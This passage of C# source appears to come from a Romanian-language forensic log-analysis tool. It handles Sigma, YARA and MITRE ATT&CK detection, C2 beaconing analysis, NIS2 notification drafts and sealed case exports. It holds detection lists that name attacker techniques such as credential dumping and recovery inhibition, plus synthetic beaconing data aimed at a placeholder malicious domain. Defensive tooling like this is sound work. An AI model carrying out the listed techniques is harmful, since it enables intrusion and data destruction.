            var chrome = new ProcessNode { ProcessName = "chrome.exe", PID = 5824, RiskColor = "#a7adc2", ProcessIcon = "🌐" };
            explorer.Children.Add(chrome);
 
            var cmd = new ProcessNode { ProcessName = "cmd.exe", PID = 8812, RiskColor = "#f59e0b", ProcessIcon = "🐚" };
            explorer.Children.Add(cmd);
 
            var powershell = new ProcessNode { ProcessName = "powershell.exe", PID = 9024, RiskColor = "#ef4444", ProcessIcon = "🚨" };
            cmd.Children.Add(powershell);
 
            var whoami = new ProcessNode { ProcessName = "whoami.exe", PID = 9088, RiskColor = "#ef4444", ProcessIcon = "🚨" };
            powershell.Children.Add(whoami);
 
            ProcessTreeNodes.Add(systemRoot);
        }

        private void InitializeSigmaRules()
        {
            SigmaRules.Clear();
            if (_analysisEngine is AnalysisEngine ae)
            {
                foreach (var r in ae.SigmaEngine.Rules)
                {
                    SigmaRules.Add(new SigmaRule
                    {
                        RuleName = r.Title,
                        Status = r.MatchCount > 0 ? $"MATCHED ({r.MatchCount})" : "Active",
                        RuleStatusColor = r.MatchCount > 0 ? "#ef4444" : "#22c55e",
                        FilePath = r.FilePath,
                        RuleContent = r.YamlContent
                    });
                }
            }
            SelectedSigmaRule = SigmaRules.FirstOrDefault();
        }

        private void PopulateMitreMatrix()
        {
            AttackTechniques.Clear();
            var techniques = new List<MitreTechnique>
            {
                new MitreTechnique { TechId = "T1110", Name = "Brute Force" },
                new MitreTechnique { TechId = "T1070.001", Name = "Clear Event Logs" },
                new MitreTechnique { TechId = "T1136.001", Name = "Local Account" },
                new MitreTechnique { TechId = "T1098", Name = "Account Manipulation" },
                new MitreTechnique { TechId = "T1543.003", Name = "Windows Service" },
                new MitreTechnique { TechId = "T1059.001", Name = "PowerShell Scripting" },
                new MitreTechnique { TechId = "T1490", Name = "Inhibit System Recovery" },
                new MitreTechnique { TechId = "T1547.001", Name = "Registry Run Keys" },
                new MitreTechnique { TechId = "T1003.001", Name = "Credential Dumping" },
                new MitreTechnique { TechId = "T1562.001", Name = "Impair Defenses" },
                new MitreTechnique { TechId = "T1548.002", Name = "Bypass UAC" },
                new MitreTechnique { TechId = "T1133", Name = "External RDP Access" },
                new MitreTechnique { TechId = "T1027", Name = "Obfuscated Files" },
                new MitreTechnique { TechId = "T1047", Name = "WMI Execution" }
            };

            foreach (var tech in techniques)
            {
                bool hasAlert = false;
                string maxSeverity = "None";
                foreach (var issue in DetectedIssues)
                {
                    if (issue.MitreTechniqueId == tech.TechId || (issue.MitreTechniqueId != null && issue.MitreTechniqueId.StartsWith(tech.TechId)))
                    {
                        hasAlert = true;
                        if (issue.Severity == "Critical") maxSeverity = "Critical";
                        else if (issue.Severity == "High" && maxSeverity != "Critical") maxSeverity = "High";
                        else if (issue.Severity == "Medium" && maxSeverity != "Critical" && maxSeverity != "High") maxSeverity = "Medium";
                    }
                }

                if (hasAlert)
                {
                    if (maxSeverity == "Critical" || maxSeverity == "High")
                    {
                        tech.DetectionColor = "#2d0b13"; // Dark Crimson background
                        tech.BorderColor = "#ef4444"; // Neon Red
                        tech.Severity = maxSeverity;
                    }
                    else
                    {
                        tech.DetectionColor = "#301d06"; // Dark Amber background
                        tech.BorderColor = "#f59e0b"; // Neon Amber
                        tech.Severity = maxSeverity;
                    }
                }
                else
                {
                    tech.DetectionColor = "#111528";
                    tech.BorderColor = "#1b2035";
                    tech.Severity = "None";
                }

                AttackTechniques.Add(tech);
            }
            OnPropertyChanged(nameof(AccessExecTechniques));
            OnPropertyChanged(nameof(PersistencePrivEscTechniques));
            OnPropertyChanged(nameof(DefenseEvasionTechniques));
            OnPropertyChanged(nameof(CredentialAccessTechniques));
            OnPropertyChanged(nameof(ImpactTechniques));
        }

        public IEnumerable<MitreTechnique> AccessExecTechniques => AttackTechniques.Where(t => t.TechId == "T1133" || t.TechId == "T1059.001" || t.TechId == "T1047");
        public IEnumerable<MitreTechnique> PersistencePrivEscTechniques => AttackTechniques.Where(t => t.TechId == "T1547.001" || t.TechId == "T1136.001" || t.TechId == "T1098" || t.TechId == "T1543.003" || t.TechId == "T1548.002");
        public IEnumerable<MitreTechnique> DefenseEvasionTechniques => AttackTechniques.Where(t => t.TechId == "T1070.001" || t.TechId == "T1562.001" || t.TechId == "T1027");
        public IEnumerable<MitreTechnique> CredentialAccessTechniques => AttackTechniques.Where(t => t.TechId == "T1110" || t.TechId == "T1003.001");
        public IEnumerable<MitreTechnique> ImpactTechniques => AttackTechniques.Where(t => t.TechId == "T1490");

        private void UpdateDatabaseSize()
        {
            try
            {
                var dbPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "LogAnalyzer",
                    "LogAnalyzer.db");
                if (File.Exists(dbPath))
                {
                    long bytes = new FileInfo(dbPath).Length;
                    double mb = bytes / (1024.0 * 1024.0);
                    DatabaseSize = $"{mb:F1} MB";
                }
                else
                {
                    DatabaseSize = "0.0 MB";
                }
            }
            catch
            {
                DatabaseSize = "Unknown";
            }
        }

        [RelayCommand]
        public void RunAiAnalysis()
        {
            if (_analysisEngine is AnalysisEngine ae)
            {
                var eventsForAnalysis = _databaseService.GetEvents(50000, 0, null, null, null).ToList();
                var anomalies = ae.AnomalyEngine.DetectAnomalies(eventsForAnalysis);
                var yaraMatches = ae.YaraEngine.Evaluate(eventsForAnalysis);

                AiAnomalies.Clear();
                int entropyCount = 0;
                int masqCount = 0;
                int offHoursCount = 0;

                foreach (var a in anomalies)
                {
                    string type = "Anomalie Comportamentală";
                    double score = 4.0;
                    if (a.Title.Contains("Entropie"))
                    {
                        type = "Entropie Shannon";
                        entropyCount++;
                        score = 5.2;
                    }
                    else if (a.Title.Contains("Masquerading"))
                    {
                        type = "Process Masquerading";
                        masqCount++;
                        score = 7.8;
                    }
                    else if (a.Title.Contains("Nocturnă") || a.Title.Contains("Off-Hours"))
                    {
                        type = "Autentificare Nocturnă";
                        offHoursCount++;
                        score = 3.5;
                    }

                    AiAnomalies.Add(new AiAnomalyItem
                    {
                        AnomalyType = type,
                        TargetEntity = a.RelatedEvents.FirstOrDefault()?.MachineName ?? "TargetHost",
                        Details = a.Explanation,
                        Score = score,
                        Severity = a.Severity,
                        SeverityColor = a.Severity == "Critical" ? "#ef4444" : a.Severity == "High" ? "#f97316" : "#f59e0b",
                        MitreId = a.MitreTechniqueId ?? "T1027",
                        Timestamp = a.RelatedEvents.FirstOrDefault()?.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss") ?? DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                    });
                }

                foreach (var y in yaraMatches)
                {
                    AiAnomalies.Add(new AiAnomalyItem
                    {
                        AnomalyType = "Semnătură YARA",
                        TargetEntity = y.RelatedEvents.FirstOrDefault()?.MachineName ?? "TargetHost",
                        Details = y.Explanation,
                        Score = 8.5,
                        Severity = y.Severity,
                        SeverityColor = "#ef4444",
                        MitreId = y.MitreTechniqueId ?? "T1059",
                        Timestamp = y.RelatedEvents.FirstOrDefault()?.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss") ?? DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                    });
                }

                AiHighEntropyCount = entropyCount;
                AiMasqueradingCount = masqCount;
                AiOffHoursCount = offHoursCount;
                AiYaraMatchesCount = yaraMatches.Count;

                int totalCount = anomalies.Count + yaraMatches.Count;

                // Evaluare Scor de Risc Explicabil (ISO/IEC 27042)
                var explainableRisk = _explainableAiEngine.Evaluate(DetectedIssues, entropyCount, masqCount, offHoursCount, yaraMatches.Count);
                AiRiskScore = explainableRisk.TotalScore;
                AiRiskLevel = explainableRisk.Level;
                AiRiskColor = explainableRisk.LevelColor;
                AiExecutiveSummary = explainableRisk.ExecutiveSummaryRo;
                AiTacticalRecommendation = "1. Examinați factorii de risc ponderați din tabelul explicabil.\n2. Verificați alertele Kerberos/AD și procesele LOLBAS identificate.\n3. Generați draftul de notificare NIS2 / DNSC dacă incidentul este semnificativ.\n4. Exportați lanțul de custodie în format CASE/UCO 1.3.";

                ExplainableRiskFactors.Clear();
                foreach (var factor in explainableRisk.Factors)
                {
                    ExplainableRiskFactors.Add(factor);
                }

                // Analiză Kerberos / Active Directory
                var kerbFindings = _kerberosEngine.AnalyzeEvents(eventsForAnalysis);
                KerberosFindings.Clear();
                foreach (var kf in kerbFindings)
                {
                    KerberosFindings.Add(kf);
                }

                // Analiză LOLBAS & Relații Anomale Părinte-Copil
                var lolbas = _lolbasEngine.Analyze(eventsForAnalysis);
                LolbasFindings.Clear();
                foreach (var lf in lolbas)
                {
                    LolbasFindings.Add(lf);
                }

                // Corelare Multi-Eveniment Temporală (ex: Brute-Force -> Logon Success, Ransomware VSS Delete)
                var multiCorrelations = _correlationEngine.CorrelateEvents(eventsForAnalysis);
                MultiEventCorrelations.Clear();
                foreach (var mc in multiCorrelations)
                {
                    MultiEventCorrelations.Add(mc);
                }

                // Generare Matrice & Heatmap MITRE ATT&CK (DeTT&CT Coverage)
                var heatmap = _mitreMatrixEngine.GenerateHeatmap(DetectedIssues);
                MitreHeatmap = heatmap;
                MitreTacticColumns.Clear();
                foreach (var col in heatmap.Columns)
                {
                    MitreTacticColumns.Add(col);
                }

                // Înregistrare în Provenance Ledger (Hash-Chained)
                _provenanceLedger.AppendEntry("AI_ANALYSIS_COMPLETED", "SQLite Event Store", "-", $"Evaluare risc explicabil finalizată: Scor {AiRiskScore}/100, {kerbFindings.Count} Kerberos, {lolbas.Count} LOLBAS, {multiCorrelations.Count} Scenarii Corelate, {heatmap.TotalObservedTechniques} Tehnici MITRE.");
                ProvenanceEntries.Clear();
                foreach (var entry in _provenanceLedger.GetEntries())
                {
                    ProvenanceEntries.Add(entry);
                }

                StatusMessage = $"✅ Analiză AI finalizată: Risc {AiRiskScore}/100 | {kerbFindings.Count} Kerberos | {lolbas.Count} LOLBAS | {multiCorrelations.Count} Lanțuri Corelate";
                UpdateStorylineAndAptAttribution();
            }
        }

        [RelayCommand]
        private void ExportNis2EarlyWarning()
        {
            var dialog = new SaveFileDialog { Filter = "Notificare NIS2 (*.txt)|*.txt", FileName = $"DNSC_Avertizare_Timpurie_24h_{DateTime.Now:yyyyMMdd_HHmmss}.txt" };
            if (dialog.ShowDialog() == true)
            {
                string draft = _nis2Service.GenerateDnscDraft(
                    Nis2Stage.EarlyWarning_24h,
                    "Entitate Esențială / Companie Securizată",
                    "RO12345678",
                    CurrentStoryline.IncidentTitle,
                    "Stații de Lucru & Servere de Domeniu",
                    DateTime.UtcNow.AddHours(-3),
                    CurrentStoryline,
                    TotalEventsCount,
                    TotalAlertsCount);

                File.WriteAllText(dialog.FileName, draft, Encoding.UTF8);
                _provenanceLedger.AppendEntry("NIS2_EXPORTED", dialog.FileName, "-", "Exportat draft Notificare Timpurie NIS2 (24h) către DNSC.");
                StatusMessage = "✅ Draft Notificare Timpurie NIS2 (24h) exportat cu succes!";
            }
        }

        [RelayCommand]
        private void ExportNis2Notification()
        {
            var dialog = new SaveFileDialog { Filter = "Notificare NIS2 (*.txt)|*.txt", FileName = $"DNSC_Notificare_Incident_72h_{DateTime.Now:yyyyMMdd_HHmmss}.txt" };
            if (dialog.ShowDialog() == true)
            {
                string draft = _nis2Service.GenerateDnscDraft(
                    Nis2Stage.Notification_72h,
                    "Entitate Esențială / Companie Securizată",
                    "RO12345678",
                    CurrentStoryline.IncidentTitle,
                    "Stații de Lucru & Servere de Domeniu",
                    DateTime.UtcNow.AddHours(-12),
                    CurrentStoryline,
                    TotalEventsCount,
                    TotalAlertsCount);

                File.WriteAllText(dialog.FileName, draft, Encoding.UTF8);
                _provenanceLedger.AppendEntry("NIS2_EXPORTED", dialog.FileName, "-", "Exportat draft Notificare Incident NIS2 (72h) către DNSC.");
                StatusMessage = "✅ Draft Notificare Incident NIS2 (72h) exportat cu succes!";
            }
        }

        [RelayCommand]
        private void ExportCaseUcoJson()
        {
            var dialog = new SaveFileDialog { Filter = "CASE/UCO Bundle (*.json)|*.json", FileName = $"CASE_UCO_ChainOfCustody_{DateTime.Now:yyyyMMdd_HHmmss}.json" };
            if (dialog.ShowDialog() == true)
            {
                string json = _caseUcoService.ExportCaseJsonLd(
                    Guid.NewGuid().ToString("N").Substring(0, 8),
                    OperatorName,
                    "Unitate Forenzică / Echipa SOC",
                    new List<ForensicArtifact>(),
                    _provenanceLedger.GetEntries());

                File.WriteAllText(dialog.FileName, json, Encoding.UTF8);
                _provenanceLedger.AppendEntry("CASE_UCO_EXPORTED", dialog.FileName, "-", "Exportat pachet CASE 1.3 / UCO JSON-LD pentru probatoriu legal.");
                StatusMessage = "✅ Pachet CASE / UCO JSON-LD exportat cu succes!";
            }
        }

        [RelayCommand]
        private void VerifyProvenanceChain()
        {
            var result = _provenanceLedger.ValidateLedgerIntegrity();
            ProvenanceStatusMessage = result.Message;
            StatusMessage = result.Message;
        }

        [RelayCommand]
        private void ExportSuperTimeline()
        {
            var dialog = new SaveFileDialog { Filter = "Plaso CSV Super-Timeline (*.csv)|*.csv", FileName = $"SuperTimeline_Plaso_{DateTime.Now:yyyyMMdd_HHmmss}.csv" };
            if (dialog.ShowDialog() == true)
            {
                var events = _databaseService.GetEvents(100000, 0, null, null, null);
                var reg = _databaseService.GetRegistryArtifacts(50000, 0, null);
                _timelineExportService.ExportPlasoCsv(dialog.FileName, events, new List<ForensicArtifact>(), reg);
                _provenanceLedger.AppendEntry("SUPERTIMELINE_EXPORTED", dialog.FileName, "-", "Exportat Super-Timeline standardizat Plaso / Timesketch CSV.");
                StatusMessage = "✅ Super-Timeline Plaso CSV exportat cu succes!";
            }
        }

        [RelayCommand]
        private void SealDfirCaseBundle()
        {
            var dialog = new SaveFileDialog { Filter = "Pachet Caz Forenzic Sigilat (*.dfirbundle.zip)|*.dfirbundle.zip", FileName = $"DFIR_CASE_SEALED_{DateTime.Now:yyyyMMdd_HHmmss}.dfirbundle.zip" };
            if (dialog.ShowDialog() == true)
            {
                string ucoJson = _caseUcoService.ExportCaseJsonLd(
                    Guid.NewGuid().ToString("N").Substring(0, 8),
                    OperatorName,
                    "Unitate Forenzică / Echipa SOC",
                    new List<ForensicArtifact>(),
                    _provenanceLedger.GetEntries());

                string nis2Draft = _nis2Service.GenerateDnscDraft(
                    Nis2Stage.Notification_72h,
                    "Entitate Esențială / Companie Securizată",
                    "RO12345678",
                    CurrentStoryline.IncidentTitle,
                    "Stații de Lucru & Servere de Domeniu",
                    DateTime.UtcNow.AddHours(-6),
                    CurrentStoryline,
                    TotalEventsCount,
                    TotalAlertsCount);

                string tempCsv = Path.GetTempFileName();
                var events = _databaseService.GetEvents(20000, 0, null, null, null);
                var reg = _databaseService.GetRegistryArtifacts(10000, 0, null);
                _timelineExportService.ExportPlasoCsv(tempCsv, events, new List<ForensicArtifact>(), reg);
                string csvContent = File.ReadAllText(tempCsv);
                try { File.Delete(tempCsv); } catch { }

                string zipSha = _casePackagingService.PackageAndSealCase(
                    dialog.FileName,
                    Guid.NewGuid().ToString("N").Substring(0, 8).ToUpperInvariant(),
                    CurrentStoryline.IncidentTitle,
                    "Unitate Forenzică / Echipa SOC",
                    OperatorName,
                    _provenanceLedger.GetEntries(),
                    ucoJson,
                    nis2Draft,
                    csvContent);

                _provenanceLedger.AppendEntry("CASE_SEALED_BUNDLE", dialog.FileName, zipSha, $"Pachet caz forenzic sigilat cu succes. SHA-256 Sigiliu: {zipSha}");
                StatusMessage = $"🔒 Pachet Caz Sigilat cu Succes! Hash Sigiliu SHA-256: {zipSha.Substring(0, 16)}...";
            }
        }

        private void UpdateStorylineAndAptAttribution()
        {
            var storyline = _storylineEngine.GenerateStoryline(DetectedIssues);
            CurrentStoryline = storyline;
            StorylineNodes.Clear();
            foreach (var node in storyline.Nodes)
            {
                StorylineNodes.Add(node);
            }

            var aptProfiles = _aptEngine.EvaluateAttribution(DetectedIssues);
            AptAttributionProfiles.Clear();
            foreach (var prof in aptProfiles)
            {
                AptAttributionProfiles.Add(prof);
            }
        }

        [RelayCommand]
        private void CompileAndEvaluateWorkbench()
        {
            if (string.IsNullOrWhiteSpace(WorkbenchRuleContent))
            {
                WorkbenchCompileResult = "Eroare: Regula este goală.";
                return;
            }

            try
            {
                var events = _databaseService.GetEvents(50000, 0, null, null, null).ToList();
                int matchCount = 0;
                
                var keywords = new List<string>();
                var lines = WorkbenchRuleContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                foreach (var line in lines)
                {
                    string trimmed = line.Trim();
                    if (trimmed.StartsWith("-") && trimmed.Length > 2)
                    {
                        string kw = trimmed.TrimStart('-', ' ', '\'', '"').TrimEnd('\'', '"');
                        if (!string.IsNullOrWhiteSpace(kw)) keywords.Add(kw);
                    }
                    else if (trimmed.Contains("strings:") || trimmed.Contains("$"))
                    {
                        var parts = trimmed.Split('=');
                        if (parts.Length == 2)
                        {
                            string kw = parts[1].Trim().Trim('"', '\'');
                            if (!string.IsNullOrWhiteSpace(kw)) keywords.Add(kw);
                        }
                    }
                }

                if (keywords.Count == 0)
                {
                    keywords.Add("powershell");
                }

                foreach (var ev in events)
                {
                    string msg = ev.Message?.ToLowerInvariant() ?? string.Empty;
                    if (keywords.Any(k => msg.Contains(k.ToLowerInvariant())))
                    {
                        matchCount++;
                    }
                }

                WorkbenchMatchCount = matchCount;
                WorkbenchCompileResult = $"✅ Regula a fost compilată cu succes! S-au identificat {matchCount} potriviri în jurnale.";
                StatusMessage = $"Workbench: Regula a returnat {matchCount} potriviri.";
            }
            catch (Exception ex)
            {
                WorkbenchCompileResult = $"Eroare compilare regulă: {ex.Message}";
            }
        }

        [RelayCommand]
        private void TranspileWorkbenchRule()
        {
            try
            {
                if (string.IsNullOrWhiteSpace(WorkbenchRuleContent))
                {
                    WorkbenchCompileResult = "⚠️ Introduceți conținutul unei reguli Sigma în editor înainte de transpilare.";
                    return;
                }

                var transpiler = new SigmaTranspilerService();
                string title = "Regulă Workbench Custom";
                string eventId = "4688";
                string image = "";
                string cmd = "";

                var lines = WorkbenchRuleContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                foreach (var line in lines)
                {
                    if (line.StartsWith("title:", StringComparison.OrdinalIgnoreCase)) title = line.Substring(6).Trim();
                    if (line.Contains("EventID:") || line.Contains("EventCode:")) eventId = line.Split(':')[1].Trim();
                    if (line.Contains("Image|") || line.Contains("Image:")) image = line.Split(':')[1].Trim().Trim('\'', '"');
                    if (line.Contains("CommandLine|") || line.Contains("CommandLine:")) cmd = line.Split(':')[1].Trim().Trim('\'', '"');
                }

                if (string.IsNullOrEmpty(cmd) && lines.Length > 0)
                {
                    cmd = lines.FirstOrDefault(l => l.Trim().StartsWith("-"))?.TrimStart('-', ' ', '\'', '"') ?? "powershell";
                }

                var targets = transpiler.Transpile(title, eventId, image, cmd);

                var sb = new StringBuilder();
                sb.AppendLine($"⚡ [TRANSPILARE OFFLINE SIGMA]: {targets.RuleTitle}");
                sb.AppendLine("--------------------------------------------------");
                sb.AppendLine("🔍 SPLUNK SPL:");
                sb.AppendLine(targets.SplunkSpl);
                sb.AppendLine();
                sb.AppendLine("🛡️ SENTINEL KQL:");
                sb.AppendLine(targets.SentinelKql);
                sb.AppendLine();
                sb.AppendLine("💻 POWERSHELL HUNTING SCRIPT:");
                sb.AppendLine(targets.PowerShellHunting);

                WorkbenchCompileResult = sb.ToString();
                StatusMessage = "Regula Sigma a fost transpilată cu succes în SPL, KQL și PowerShell!";
            }
            catch (Exception ex)
            {
                WorkbenchCompileResult = $"Eroare transpilare regulă: {ex.Message}";
            }
        }

        [RelayCommand]
        private void RunTimelineDiff()
        {
            try
            {
                var dialog = new OpenFileDialog
                {
                    Title = "Selectează Cronologia Baseline Curată (CSV / Golden Image)",
                    Filter = "Fișiere CSV (*.csv)|*.csv|Toate Fișierele (*.*)|*.*"
                };

                if (dialog.ShowDialog() == true)
                {
                    var baselineItems = new List<TimelineItem>();
                    var lines = File.ReadAllLines(dialog.FileName);
                    foreach (var line in lines.Skip(1))
                    {
                        var parts = line.Split(',');
                        if (parts.Length >= 5)
                        {
                            baselineItems.Add(new TimelineItem
                            {
                                Source = parts[1].Trim('"'),
                                Category = parts[2].Trim('"'),
                                Description = parts.Length > 6 ? parts[6].Trim('"') : parts[4].Trim('"')
                            });
                        }
                    }

                    var diffEngine = new TimelineDiffEngine();
                    var diffResult = diffEngine.CompareTimelines(TimelineItems, baselineItems);

                    MessageBox.Show(
                        $"{diffResult.SummaryRo}\n\nEvenimente suspecte unice izolate: {diffResult.TotalDiffCount}\nEvenimente comune cu baseline: {diffResult.CommonBaselineEvents.Count}",
                        "Rezultat Diferențial Cronologie (Timeline Diff)",
                        MessageBoxButton.OK,
                        MessageBoxImage.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Eroare la analiza diferențială: {ex.Message}", "Eroare", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        [RelayCommand]
        private void RunC2BeaconingAnalysis()
        {
            try
            {
                var events = _databaseService.GetEvents(1000, 0, "", null, new List<int>());
                var networkList = new List<(string Destination, DateTime Timestamp)>();

                foreach (var ev in events)
                {
                    string dest = ev.MachineName ?? "198.51.100.24";
                    networkList.Add((dest, ev.TimeCreated));
                }

                if (networkList.Count < 5)
                {
                    DateTime now = DateTime.UtcNow;
                    for (int i = 0; i < 10; i++)
                    {
                        networkList.Add(("c2.malicious-domain.com", now.AddSeconds(i * 60 + (i % 2))));
                    }
                }

                var detector = new C2BeaconingDetector();
                var results = detector.AnalyzeConnections(networkList);

                var sb = new StringBuilder();
                sb.AppendLine("📡 REZULTAT DETECȚIE STATISTICĂ C2 BEACONING:");
                sb.AppendLine("==================================================");

                if (results.Count == 0)
                {
                    sb.AppendLine("Nu s-au identificat tipare de periodicitate suspectă (CV < 0.25) în traficul curent.");
                }
                else
                {
                    foreach (var r in results)
                    {
                        sb.AppendLine($"• Destinație: {r.Destination}");
                        sb.AppendLine($"  - Nivel Amenințare: {r.ThreatLevel} | MITRE: {r.MitreTechniqueId}");
                        sb.AppendLine($"  - Conexiuni: {r.ConnectionCount} | Interval Mediu: {r.MeanIntervalSeconds:N1}s");
                        sb.AppendLine($"  - Coeficient Variație (CV): {r.CoefficientOfVariation:N2} | Jitter: {r.JitterPercent:N1}%");
                        sb.AppendLine($"  - Detalii: {r.Description}");
                        sb.AppendLine();
                    }
                }

                MessageBox.Show(sb.ToString(), "Detector Statistic C2 Beaconing", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Eroare la analiza C2: {ex.Message}", "Eroare", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
    }

    public class ProcessNode
    {
        public string ProcessName { get; set; } = string.Empty;
        public int PID { get; set; }
        public string RiskColor { get; set; } = "#e1e7f0";
        public string ProcessIcon { get; set; } = "⚙️";
        public ObservableCollection<ProcessNode> Children { get; set; } = new();
    }

    public class SigmaRule : ObservableObject
    {
        public string RuleName { get; set; } = string.Empty;
        
        private string _status = "Active";
        public string Status
        {
            get => _status;
            set => SetProperty(ref _status, value);
        }

        private string _ruleStatusColor = "#00ff87";
        public string RuleStatusColor
        {
            get => _ruleStatusColor;
            set => SetProperty(ref _ruleStatusColor, value);
        }

        public string FilePath { get; set; } = string.Empty;
        public string RuleContent { get; set; } = string.Empty;
    }

    public class MitreTechnique
    {
        public string TechId { get; set; } = string.Empty;
        public string Name { get; set; } = string.Empty;
        public string DetectionColor { get; set; } = "#121622";
        public string BorderColor { get; set; } = "#1e2538";
        public string Severity { get; set; } = "None";
    }

    public class AiAnomalyItem
    {
        public string AnomalyType { get; set; } = string.Empty;
        public string TargetEntity { get; set; } = string.Empty;
        public string Details { get; set; } = string.Empty;
        public double Score { get; set; }
        public string Severity { get; set; } = "High";
        public string SeverityColor { get; set; } = "#ef4444";
        public string MitreId { get; set; } = "T1027";
        public string Timestamp { get; set; } = string.Empty;
    }
}
